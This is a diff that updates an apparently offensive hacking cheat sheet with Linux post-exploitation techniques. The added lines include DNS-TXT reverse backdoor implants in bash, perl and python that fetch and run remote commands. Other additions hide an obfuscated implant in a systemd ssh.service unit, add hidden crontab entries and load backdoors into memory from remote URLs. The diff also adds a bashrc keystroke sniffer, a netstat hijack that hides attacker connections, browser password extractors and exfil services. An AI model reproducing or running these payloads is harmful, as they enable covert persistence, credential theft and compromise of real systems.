@@ -167,6 +167,12 @@ resize &>/dev/null || { stty -echo;printf "\e[18t"; read -t5 -rdt R;IFS=';' read
 # stty sane rows 60 cols 160
 ```
 
+We use `anew` a lot, and this is a quick workaround:
+```shell
+xanew() { awk 'hit[$0]==0 {hit[$0]=1; print $0}'; }
+which anew &>/dev/null || alias anew=xanew
+```
+
 Bonus tip:
 Any command starting with a " " (space) will [not get logged to history](https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces) either.
 ```
@@ -257,8 +263,8 @@ eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c20
 Create a fake netstat binary in /usr/local/sbin. On a default Debian (and most Linux) the PATH variables (`echo $PATH`) lists /usr/local/sbin _before_ /usr/bin. This means that our hijacking binary /usr/local/sbin/netstat will be executed instead of /usr/bin/netstat.
 
 ```shell
-echo -e "#! /bin/bash
-exec /usr/bin/netstat \"\$@\" | grep -Fv -e :22 -e 1.2.3.4" >/usr/local/sbin/netstat \
+echo '#! /bin/bash
+exec /usr/bin/netstat "$@" | grep -Fv -e :22 -e 1.2.3.4' >/usr/local/sbin/netstat \
 && chmod 755 /usr/local/sbin/netstat \
 && touch -r /usr/bin/netstat /usr/local/sbin/netstat
 ```
@@ -330,7 +336,11 @@ echo -e "id #\\033[2K\\033[1A" >>~/.bashrc
 ### The '#' after the command 'id' is a comment and is needed so that bash still
 ### executes the 'id' but ignores the two ANSI escape sequences.
 ```
-Note: We use `echo -e` to convert `\\033` to the ANSI escape character (hex 0x1b).
+
+Add a hidden crontab line:
+```sh
+(crontab -l; echo -e "0 2 * * * { id; date;} 2>/dev/null >/tmp/.thc-was-here #\\033[2K\\033[1A") | crontab
+```
 
 Adding a `\r` (carriage return) goes a long way to hide your ssh key from `cat`:
 ```shell
@@ -342,20 +352,20 @@ echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >a
 <a id="parallel"></a>
 **1.ix. Execute in parallel with separate logfiles***
 
-Scan 20 hosts in parallel and log each result to a separate log file:
+Note: The same can be achieved with [parallel](https://www.gnu.org/software/parallel/parallel_tutorial.html).
+
+Scan hosts with 20 parallel tasks:
 ```sh
-# hosts.txt contains a long list of hostnames or ip-addresses
-# (Use -sCV for more verbose version)
-cat hosts.txt | parallel -j20 'exec nmap -n -Pn -sV -F --open -oG - {} >nmap_{}.txt'
+cat hosts.txt | xargs -P20 -I{} --process-slot-var=SLOT bash -c 'exec nmap -n -Pn -sV -F --open -oG - {} >>"nmap_${SLOT}.txt"'
 ```
-Note: The example uses `exec` to replace the underlying shell with the last process (nmap, gsexec). It's optional but reduces the number of running shell binaries.
+- `exec` is used to replace the underlying shell with the last process (nmap). It's optional but reduces the number of running/useless shell binaries.
+- `${SLOT}` contains a value between 0..19. It's the "task number". We use it to write the nmap-results into 20 separate files.
 
 Execute [Linpeas](https://github.com/carlospolop/PEASS-ng) on all [gsocket](https://www.gsocket.io/deploy) hosts using 40 workers:
 ```sh
-# secrets.txt contains a long list of gsocket-secrets for each remote server.
-cat secrets.txt | parallel -j40 'mkdir host_{}; exec gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>host_{}/linpeas.err'
+cat secrets.txt | xargs -P40 -I{} --process-slot-var=SLOT bash -c 'mkdir host_{}; gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>>"linpeas-${SLOT}.err"'
 ```
-Note: `xargs -P20 -I{}` is another good way but it cannot log each output into a separate file.  
+- Log each result into a separate file but log all errors into a error-log file by task-number.
 
 ---
 <a id="ssh"></a>
@@ -386,6 +396,7 @@ xssh() {
     stty "${ttyp}"
 }
 ```
+(See [Hackshell](https://github.com/hackerschoice/hackshell))
 
 <a id="ssh-master"></a>
 **2.ii Multiple shells via 1 SSH/TCP connection**
@@ -595,7 +606,12 @@ bore local 31337 --to bore.pub
 using [serveo.net](https://serveo.net) (free):
 ```sh
 # Forward a random public TCP port to localhost:31337
-ssh -R 0:localhost:31337 serveo.net
+ssh -R 0:localhost:31337 tcp@serveo.net
+```
+
+using [pinggy.io](https://www.pinggy.io) (60 mins free):
+```sh
+ssh -p 443 -R 0:localhost:31337 tcp@a.pinggy.io
 ```
 
 See also [remote.moe](#revese-shell-remote-moe) (free) to forward raw TCP from the target to your workstation or [playit](https://playit.gg/) (free) or [ngrok](https://ngrok.com/) (paid subscription) to forward a raw public TCP port.
@@ -660,7 +676,7 @@ More: [https://github.com/twelvesec/port-forwarding](https://github.com/twelvese
 
 Bounce through a host/router without needing to run a userland proxy or forwarder:
 ```sh
-ipfwinit() {
+bounceinit() {
     echo 1 >/proc/sys/net/ipv4/ip_forward
     echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
     [ $# -le 0 ] && set -- "0.0.0.0/0"
@@ -674,18 +690,20 @@ ipfwinit() {
     iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
     iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
 }
-ipfw() {
+bounce() {
     iptables -t nat -A PREROUTING -p tcp --dport "${1:?}" -m mark --mark 1188 -j DNAT --to ${2:?}:${3:?}
 }
-ipfwinit                             # Allow EVERY IP to bounce
-# ipfwinit "1.2.3.4/16" "6.6.0.0/16" # Only allow these SOURCE IP's to bounce
+bounceinit                             # Allow EVERY IP to bounce
+# bounceinit "1.2.3.4/16" "6.6.0.0/16" # Only allow these SOURCE IP's to bounce
 ```
+(See [Hackshell](https://github.com/hackerschoice/hackshell) `bounce`)
+
 
 Then set forwards like so:
 ```sh
-ipfw 31337 144.76.220.20 22 # Bounce 31337 to segfault's ssh port.
-ipfw 31338 127.0.0.1 8080   # Bounce 31338 to the server's 8080 (localhost)
-ipfw 53 213.171.212.212 443 # Bounce 53 to gsrn-relay on port 443
+bounce 31337 144.76.220.20 22 # Bounce 31337 to segfault's ssh port.
+bounce 31338 127.0.0.1 8080   # Bounce 31338 to the server's 8080 (localhost)
+bounce 53 213.171.212.212 443 # Bounce 53 to gsrn-relay on port 443
 ```
 
 We use this trick to reach the gsocket-relay-network (or TOR) from deep inside firewalled networks.
@@ -858,7 +876,27 @@ nmap nmap -n -Pn -sCV -F --open --min-rate 10000 scanme.nmap.org
 nmap -A -F -Pn --min-rate 10000 --script vulners.nse --script-timeout=5s scanme.nmap.org
 ```
 
-Using bash:
+Scan for open TCP ports:
+```sh
+_scan_single() {
+    local opt=("${2}")
+    [ -f "$2" ] && opt=("-iL" "$2")
+    nmap -Pn -p"${1}" --open -T4 -n -oG - "${opt[@]}" 2>/dev/null | grep -F Ports
+}
+scan() {
+    local port="${1:?}"
+    shift 1
+    for ip in "$@"; do
+        _scan_single "$port" "$ip"
+    done
+}
+# scan <ports> <IP or file> ...
+# scan 22,80,443 192.168.0.1
+# scan - 192.168.0.1-254" 10.0.0.1-254
+```
+(See [Hackshell](https://github.com/hackerschoice/hackshell) `scan`)
+
+Simple bash port-scanner:
 ```shell
 timeout 5 bash -c "</dev/tcp/1.2.3.4/31337" && echo OPEN || echo CLOSED
 ```
@@ -886,10 +924,10 @@ nice -n 19 hashcat -o cracked.txt my-hash.txt -w1 -a3 10-days_7-16.hcmask -O -d2
 
 Crack OpenSSH's `known_hosts` hashes to reveal the IP address:
 ```shell
-curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/ipv4_hcmask.txt -o ipv4_hcmask.txt
-curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/kh-converter.py -o kh-converter.py
-python kh-converter.py ~/.ssh/known_hosts >~/.ssh/known_hosts_hashes
-hashcat -m 160 --quiet --hex-salt ~/ssh/known_hosts_hashes -a 3 ipv4_hcmask.txt 
+curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/ipv4_hcmask.txt -O
+curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/kh-converter.py -O
+python3 kh-converter.py ~/.ssh/known_hosts >known_hosts_hashes
+hashcat -m 160 --quiet --hex-salt known_hosts_hashes -a 3 ipv4_hcmask.txt 
 ```
 
 👉 Read the [FAQ](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions).
@@ -1842,6 +1880,8 @@ curl http://127.0.0.1:8080/x.php -d0='' -d1='echo file_get_contents("/etc/hosts"
 <a id="reverse-dns-backdoor"></a>
 **6.vi. Smallest reverse DNS-tunnel Backdoor**
 
+...in PHP:
+---
 Execute arbitrary commands on a server that is _not_ accessible from the public Internet by using a reverse DNS trigger.
 
 Add this line (the implant) at the beginning of any PHP file:
@@ -1858,12 +1898,97 @@ echo -n '@system("{ id; date;}>/tmp/.b00m 2>/dev/null");' |base64 -w0
 - The implant is a `bootloader`. Use a while loop to download and execute larger paypload via DNS.
 - Check out our favorite places to [register a domain anonymously](#pub). [Cloudflare's](https://www.cloudflare.com) Free-Tier is a good start.
 
-Can also be triggered via `~/.bashrc` or the user's crontab. Use (example):
+...in BASH:
+---
+Add this implant to the target's `~/.bashrc` or the crontab (demo-paypload):
 ```shell
-# Use a "double bash" to redirect _also_ $()-subshell error to /dev/null:
+# Use a "double bash" to redirect _also_ errors from $()-subshell to /dev/null:
 bash -c 'exec bash -c "{ $(dig +short b00m2.team-teso.net TXT|tr -d \ \"|base64 -d);}"'&>/dev/null
 ```
 
+or change the demo-payload for an elaborate payload:
+- Starts a background daemon to poll every hour for command execution.
+- Depends on bash, dig and base64 only.
+- Hides as `sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups`
+- Example uses `b00m2.team-teso.net` again and creates /tmp/.b00m every hour.
+
+Cut & Paste the following into the target's shell to generate the 1-line implant:
+```shell
+# If dig does not exists then replace /dig +short.../ with
+# /nslookup -q=txt '"$D"'|grep -Fm1 "text ="|sed -E "s|.*text = (.*)|\1|g;s|[\" ]||g"|base64 -d|bash/
+# or use the Perl example below.
+base64 -w0 >x.txt <<-'EOF'
+D=b00m2.team-teso.net
+P="sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
+M=/dev/shm/.cache${UID}
+[ -f $M ]&&exit
+touch $M
+(echo 'slp(){ local IFS;[ -n "${_sfd:-}" ]||exec {_sfd}<> <(:);read -t$1 -u$_sfd||:;}
+slp 1
+while :; do
+	dig +short '"$D"' TXT|tr -d \ \"|base64 -d|bash
+	slp 3600
+done'|exec -a "$P" bash &) &>/dev/null
+EOF
+echo "===> Add the following to the target's ~/.bashrc or cronjob:"$'\n\033[0;36m'"echo $(<x.txt)|base64 -d|bash"$'\033[0m'
+rm -f x.txt
+```
+
+Add the 1-line result of the script to any startup script on the target (use crontab, ~/.bashrc, [udev](https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp) or `ExecStartPre=`). Here is a clever example for */usr/lib/systemd/system/ssh.service* (with some additional obfuscation):
+```
+...
+[Service]
+EnvironmentFile=-/etc/default/ssh
+Environment="SSHD=echo RD1iMDBtMi50ZWFtLXRlc28ubmV0ClA9InNzaGQ6IC91c3Ivc2Jpbi9zc2hkIC1EIFtsaXN0ZW5lcl0gMCBvZiAxMC0xMDAgc3RhcnR1cHMiCk09L2Rldi9zaG0vLmNhY2hlJHtVSUR9ClsgLWYgJE0gXSYmZXhpdAp0b3VjaCAkTQooZWNobyAnc2xwKCl7IGxvY2FsIElGUztbIC1uICIke19zZmQ6LX0iIF18fGV4ZWMge19zZmR9PD4gPCg6KTtyZWFkIC10JDEgLXUkX3NmZHx8Ojt9CnNscCAxCndoaWxlIDo7IGRvCmRpZyArc2hvcnQgJyIkRCInIFRYVHx0ciAtZCBcIFwifGJhc2U2NCAtZHxiYXNoCnNscCAzNjAwCmRvbmUnfGV4ZWMgLWEgIiRQIiBiYXNoICYpICY+L2Rldi9udWxsCg==|base64 -d|bash"
+ExecStartPre=-bash -c 'eval $SSHD'
+ExecStartPre=/usr/sbin/sshd -t
+ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
+...
+```
+
+...in PERL:
+---
+The same but only needing perl + bash (not dig):
+```shell
+perl -MMIME::Base64 -e '$/=undef;print encode_base64(<>,"")' >x.txt <<-'EOF'
+D=b00m2.team-teso.net
+P="sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
+M=/dev/shm/.cache-1-${UID}
+(echo 'use Net::DNS;use MIME::Base64;exit(0) if -e "'"$M"'";close(open($f,">","'"$M"'"));for (;;) { system decode_base64((Net::DNS::Resolver->new->query(q/'"$D"'/,q/TXT/)->answer)[0]->txtdata=~y/ \\//dr);sleep(3600)}'|exec -a "$P" perl &) &>/dev/null
+EOF
+echo "===> Execute the following on the target:"$'\n\033[0;36m'"perl -MMIME::Base64 -e'print decode_base64(\"$(<x.txt)\")'|bash"$'\033[0m'
+rm -f x.txt
+```
+(thank you to LouCipher for a perl verison)
+
+...in PYTHON:
+---
+Cut & paste the following into your shell:
+```shell
+pydnsbackdoorgen() {
+    local str
+    echo -e "This is the TXT record for ${1:?}\e[0;33m"
+    base64 -w0 <"${2:?}"
+    str="$(echo -en 'import dns.resolver\nexec(base64.b64decode("".join([d.to_text() for d in dns.resolver.resolve("'"${1:?}"'", "TXT").rrset])))' | base64 -w 0)"
+    echo -e "\e[0m\nAdd this implant string to a target's python script:\e[0;32m"
+    echo "exec('"'try:\n\timport base64\n\texec(base64.b64decode("'"${str}"'"))\nexcept:\n\tpass'"')"
+    echo -e "\e[0m"
+}
+```
+
+Generate your payload (`egg.py` will get executed on the target):
+```shell
+cat >egg.py<<-'EOF'
+import time
+dns.resolver.resolve(f"{int(time.time())}.yzlespkpfkqfrtwgvhngkyqbuod49rgmo.oast.fun")
+EOF
+```
+
+Generate your implant (and follow the instructions):
+```shell
+pydnsbackdoorgen b00mpy.team-teso.net egg.py
+```
+   
 <a id="ld-backdoor"></a>
 **6.vii. Local Root Backdoor**
 
@@ -1966,14 +2091,16 @@ wfind() {
 # Usage: wfind /etc /var /usr 
 ```
 
-Find local passwords (using [noseyparker](https://github.com/praetorian-inc/noseyparker)):
+Find local passwords (using [noseyparker](https://github.com/praetorian-inc/noseyparker) or [trufflehog](https://github.com/trufflesecurity/trufflehog)):
 ```sh
 curl -o np -fsSL https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static
 chmod 700 np && \
 ./np scan . && \
 ./np report --color=always | less -R
 ```
-(Or use [PassDetective](https://github.com/aydinnyunus/PassDetective) to find passwords in ~/.*history)
+- Use [PassDetective](https://github.com/aydinnyunus/PassDetective) to find passwords in ~/.*history
+- Use [Chrome-ABE](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) to extract & decrypt Chrome passwords from the running process (windows only)
+- Extract passwords from Browsers using [https://github.com/kiryano/chrome-password-decryptor](https://github.com/kiryano/chrome-password-decryptor)
 
 Using `grep`:
 ```sh
@@ -2096,7 +2223,7 @@ mount -o bind,ro /boot/backdoor.cgi /var/www/cgi/blah.cgi
 <a id="nosudo"></a>
 **8.vi. Change user without sudo/su**
 
-Needed for taking screenshots of X11 sessions (aka `xwd -root -display :0 | convert - jpg:screenshot.jpg`)
+Needed for taking screenshots of X11 sessions (aka `xwd -display :0 -silent -root | convert - jpg:screenshot.jpg` or `import -display :0 -window root screenshot.png`)
 ```bash
 xsu() {
     local name="${1:?}"
@@ -2145,14 +2272,14 @@ Verify that binary can not be unpacked:
 upx -d "${BIN}"  # Should fail with 'not packed by UPX'
 ```
 
-Optionally encrypt it with [Ezuri](https://github.com/guitmz/ezuri) thereafter.
+Optionally encrypt it with [bincrypter](https://github.com/hackerschoice/bincrypter).
 
 <a id="memexec"></a>
 **8.viii. Deploying a backdoor without touching the file-system**
 
-How to start a backdoor without writing to the file-system or when all writeable locations are mounted with the evil `noexec`-flag.
+Start a backdoor without writing to the file-system or when all writeable locations are mounted with the evil `noexec`-flag.
 
-A Perl one-liner to load a binary into memory and execute it (without touching any disk or /dev/shm or /tmp).
+A Perl one-liner to load a binary into memory and execute it (without touching any disk or /dev/shm or /tmp). See [Hackshell](https://github.com/hackerschoice/hackshell/blob/main/hackshell.sh) for more.
 ```sh
 memexec() {
     local stropen strread
@@ -2178,7 +2305,7 @@ exec {"/proc/$$/fd/$f"} '"${strargv0}"'@ARGV or die "exec: $!";' -- "$@"
 
 The shortest possible variant is (example):
 ```shell
-memexec(){ perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@";}
+memexec(){ perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- "$@";}
 # Example: cat /usr/bin/id | memexec -u
 ```
 (Thank you [tmp.Out](https://tmpout.sh/) for some educated discussions and [previous work](https://captain-woof.medium.com/how-to-execute-an-elf-in-memory-living-off-the-land-c7e67dbc3100) by others)
@@ -2190,13 +2317,13 @@ GS_ARGS="-ilqD -s SecretChangeMe31337" memexec <(curl -SsfL https://gsocket.io/b
 
 The backdoor can also be piped via SSH directly into the remote's memory, and executed:
 ```sh
-MX='-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV'
+MX='-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255'
 curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | ssh root@foobar "exec perl '$MX' -- -ilqD -s SecretChangeMe31337"
 ```
 
 If you have a single-shot at remote executing a command (like via a PHP exploit) then this is your line:
 ```sh
-curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)|perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- -ilqD -s SecretChangeMe31337
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)|perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- -ilqD -s SecretChangeMe31337
 ```
 
 ---
@@ -2287,13 +2414,15 @@ A 1-liner for `~/.bashrc` to sniff the user's keystrokes and save them to `~/.co
 
 Deploy: Cut & paste the following onto the target and follow the instructions:
 ```sh
+# This is a glorified version of:
+# [ -z "$LC_PTY" ] && [ -t 0 ] && [[ "$HISTFILE" != *null* ]] && [ -d ~/.config/.pty ] && { script -V; } &>/dev/null && LC_PTY=1 exec -a "sshd: pts/0" script -fqaec "exec ${BASH_EXECUTION_STRING:--a -bash '"$(command -v bash)"'}" -I ~/.config/.pty/.@pty-unix.$$
 command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
 && { mkdir -p ~/.config/.pty 2>/dev/null; :; } \
 && curl -o ~/.config/.pty/pty -fsSL "https://bin.pkgforge.dev/$(uname -m)/script" \
 && curl -o ~/.config/.pty/ini -fsSL "https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m)" \
 && chmod 755 ~/.config/.pty/ini ~/.config/.pty/pty \
 && echo -e '----------\n\e[0;32mSUCCESS\e[0m. Add the following line to \e[0;36m~/.bashrc\e[0m:\e[0;35m' \
-&& echo -e '[ -z "$LC_PTY" ] && [ -t 0 ] && [[ "$HISTFILE" != *null* ]] && { ~/.config/.pty/ini -h && ~/.config/.pty/pty -V; } &>/dev/null && LC_PTY=1 exec ~/.config/.pty/ini -a "sshd: pts/0" ~/.config/.pty/pty -fqaec "exec ${BASH_EXECUTION_STRING:--a -bash '"$(command -v bash)"'}" -I ~/.config/.pty/.@pty-unix.$$\e[0m'
+&& echo -e '[ -z "$LC_PTY" ] && [ -t 0 ] && [[ "$HISTFILE" != *null* ]] && [ -d ~/.config/.pty ] && { ~/.config/.pty/ini -h && ~/.config/.pty/pty -V; } &>/dev/null && LC_PTY=1 exec ~/.config/.pty/ini -a "sshd: pts/0" ~/.config/.pty/pty -fqaec "exec ${BASH_EXECUTION_STRING:--a -bash '"$(command -v bash)"'}" -I ~/.config/.pty/.@pty-unix.$$\e[0m'
 ```
 
 - Combined with zapper to hide command options from the process list.
@@ -2486,18 +2615,19 @@ Many other services (for free)
 Reverse DNS from multiple public databases:
 ```sh
 rdns () {
-    curl -fsSL "https://ip.thc.org/api/v1/download?ip_address=${1:?}&limit=10&apex_domain=${2}" | column -t -s,
+    curl -m10 -fsSL "https://ip.thc.org/${1:?}?limit=20&f=${2}"
 }
 # rdns <IP>
 ```
 
-Find sub domains from TLS Database:
+Find sub domains from TLS/THC-IP Database:
 ```sh
-crt() {
+sub() {
     [ $# -ne 1 ] && { echo >&2 "crt <domain-name>"; return 255; }
     curl -fsSL "https://crt.sh/?q=${1:?}&output=json" --compressed | jq -r '.[].common_name,.[].name_value' | anew | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]'
+    curl -fsSL "https://ip.thc.org/sb/${1:?}"
 }
-# crt <domain>
+# sub <domain>
 ```
 
 | OSINT Hacker Tools ||
@@ -2601,7 +2731,8 @@ Phishing
 2. https://da.gd/ - Tinier TinyUrl and allows https://www.google.com-fish-fish@da.gd/blah
 
 Tools
-1. https://github.com/guitmz/ezuri - Obfuscate Linux binaries
+1. https://github.com/hackerschoice/bincrypter - Obfuscate & pack _any_ Linux binaries
+1. https://github.com/guitmz/ezuri - Obfuscate Linux binaries (ELF only)
 1. https://tmate.io/ - Share a screen with others
 
 Callback / Canary / Command & Control
@@ -2616,7 +2747,8 @@ Tunneling
 
 Exfil<a id="cloudexfil"></a>
 1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - `blitz -l` / `blitz foo.txt`
-2. [RedDrop](https://github.com/cyberbutler/RedDrop) - run your own Exfil Server
+2. [Segfault.net](https://thc.org/segfault) - type `exfil`
+3. [RedDrop](https://github.com/cyberbutler/RedDrop) - run your own Exfil Server
 1. [Mega](https://mega.io/cmd)
 2. [oshiAt](https://oshi.at/) - also on TOR. `curl -T foo.txt https://oshi.at`
 3. [0x0.at](https://0x0.st) - `curl -F'file=@foo.txt'  https://0x0.st/`
